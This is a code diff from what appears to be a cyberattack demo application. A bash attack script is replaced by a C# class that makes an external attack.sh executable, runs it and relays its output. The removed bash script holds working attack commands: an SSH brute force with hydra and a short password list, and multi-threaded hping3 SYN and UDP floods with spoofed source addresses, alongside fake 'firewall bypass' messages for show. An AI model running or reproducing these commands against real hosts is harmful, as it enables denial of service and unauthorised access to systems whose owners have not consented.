@@ -1,112 +1,106 @@
-#!/bin/bash
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading.Tasks;
 
-# ==========================================
-#  演出用カラー定義 (アプリ本体は変更不要)
-# ==========================================
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+namespace CyberAttackDemo
+{
+    public class AttackEngine
+    {
+        // ログ出力イベント（UIに通知するため）
+        public event Action<string>? OnLogReceived;
+        
+        public const string AttackScriptName = @"./Attack/attack.sh";
 
-# root権限チェック
-if [ "$EUID" -ne 0 ]; then
-  echo "エラー: root権限で実行してください。"
-  exit 1
-fi
+        // 外部コマンド実行
+        public async Task RunCommandAsync(string command, string args)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName = command,
+                    Arguments = args,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
 
-TARGET_IP=${1:-"127.0.0.1"}
-DURATION=${2:-"15"}
-MODE_ARG=${3:-"dos"}
-SSH_USER=${4:-"root"}
+                using var process = new Process { StartInfo = psi };
 
-PORT=80
-THREADS=4
+                // 標準出力
+                process.OutputDataReceived += (s, e) => 
+                {
+                    if (e.Data != null)
+                    {
+                        // ここで翻訳ロジックを通す
+                        string translated = LogTranslator.Translate(e.Data);
+                        OnLogReceived?.Invoke(translated);
+                    }
+                };
+                
+                // エラー出力
+                process.ErrorDataReceived += (s, e) =>
+                {
+                    if (e.Data != null) OnLogReceived?.Invoke($"[STDERR] {e.Data}");
+                };
 
-cleanup() {
-    echo ""
-    echo -e "${RED}[!] ABORT SIGNAL RECEIVED.${NC}"
-    echo -e "${RED}[*] Killing processes...${NC}"
-    pkill -P $$ hping3 > /dev/null 2>&1
-    pkill -P $$ hydra > /dev/null 2>&1
-    echo -e "${RED}[*] Terminated.${NC}"
-    exit
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                await process.WaitForExitAsync();
+            }
+            catch (Exception ex)
+            {
+                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
+                
+                // デモ用フォールバックメッセージ
+                await Task.Delay(1000);
+                if (command.Contains("bash") || args.Contains("attack.sh"))
+                {
+                     OnLogReceived?.Invoke("[SIMULATION] Executing shell script sequence...");
+                }
+                else
+                {
+                    OnLogReceived?.Invoke("Target appears to be secure or tool not installed.");
+                }
+            }
+        }
+
+        // 攻撃用シェルスクリプトの存在確認（自動生成は削除）
+        public async Task EnsureAttackScriptExistsAsync()
+        {
+            try
+            {
+                string? dir = Path.GetDirectoryName(AttackScriptName);
+                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
+                {
+                    Directory.CreateDirectory(dir);
+                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
+                }
+
+                // ファイルが存在するか確認するだけに変更（上書きしない）
+                if (File.Exists(AttackScriptName))
+                {
+                    OnLogReceived?.Invoke($"[SYSTEM] Loaded attack script: {AttackScriptName}");
+                    
+                    // 念のため実行権限を付与
+                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
+                }
+                else
+                {
+                    OnLogReceived?.Invoke($"[WARNING] Attack script not found at: {AttackScriptName}");
+                    OnLogReceived?.Invoke($"[WARNING] Please place your 'attack.sh' file in the 'Attack' folder.");
+                }
+                
+                await Task.CompletedTask;
+            }
+            catch (Exception ex)
+            {
+                OnLogReceived?.Invoke($"[ERROR] Failed to check script: {ex.Message}");
+            }
+        }
+    }
 }
-
-trap cleanup SIGINT SIGTERM EXIT
-
-# ==========================================
-#  オープニング演出 (ハッカーっぽいロゴ)
-# ==========================================
-echo -e "${RED}"
-cat << "EOF"
-  ____ ____  ___ _   _  ____ 
- / ___|  _ \|_ _| \ | |/ ___|
-| |  _| |_) || ||  \| | |  _ 
-| |_| |  _ < | || |\  | |_| |
- \____|_| \_\___|_| \_|\____|
-EOF
-echo -e "${NC}"
-echo -e "${YELLOW}TARGET LOCKED: ${RED}$TARGET_IP${NC}"
-echo -e "${YELLOW}ATTACK VECTOR: ${CYAN}$MODE_ARG${NC}"
-echo "------------------------------------------"
-
-# ==========================================
-#  フェイクのハッキングプロセス (雰囲気作り)
-# ==========================================
-# ※実際には何もしていませんが、スキャンしているフリをします
-echo -n "[*] Bypassing Firewall Rules..."
-sleep 0.5
-echo -e " ${GREEN}[OK]${NC}"
-
-echo -n "[*] Injecting Payload..."
-sleep 0.3
-echo -e " ${GREEN}[OK]${NC}"
-
-echo -n "[*] Establishing Uplink..."
-sleep 0.3
-echo -e " ${GREEN}[CONNECTED]${NC}"
-echo "------------------------------------------"
-
-if [ "$MODE_ARG" = "hydra" ]; then
-    # --- Hydra SSH Crack ---
-    echo -e "${CYAN}[*] Starting Hydra SSH Brute Force...${NC}"
-    echo -e "${CYAN}[*] Target User: $SSH_USER${NC}"
-    
-    # デモ用パスワードリスト作成
-    echo "123456" > passlist.txt
-    echo "password" >> passlist.txt
-    echo "admin" >> passlist.txt
-    echo "root" >> passlist.txt
-    echo "kali" >> passlist.txt
-    
-    # Hydra実行
-    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
-    
-    rm passlist.txt
-
-else
-    # --- DoS Attack (hping3) ---
-    echo -e "${RED}[*] INITIATING FLOOD ATTACK sequence...${NC}"
-    
-    for (( i=1; i<=THREADS; i++ ))
-    do
-        # TCP SYN Flood
-        echo -e "${RED}[+] Launching Thread $i (TCP-SYN)${NC}"
-        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
-        # UDP Flood
-        echo -e "${RED}[+] Launching Thread $i (UDP-FLOOD)${NC}"
-        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
-    done
-    
-    echo -e "${YELLOW}[!] ALL SYSTEMS GO. MAXIMUM LOAD REACHED.${NC}"
-    
-    # 攻撃中の演出（マトリックス風のノイズを少し出す）
-    # ※C#側のログに大量に流れるので、雰囲気が出ます
-    for (( i=0; i<5; i++ )); do
-        sleep 1
-        echo -e "${CYAN}Sending packets... $(($RANDOM % 1000)) Mbps egress${NC}"
-    done
-    
-    wait
-fi
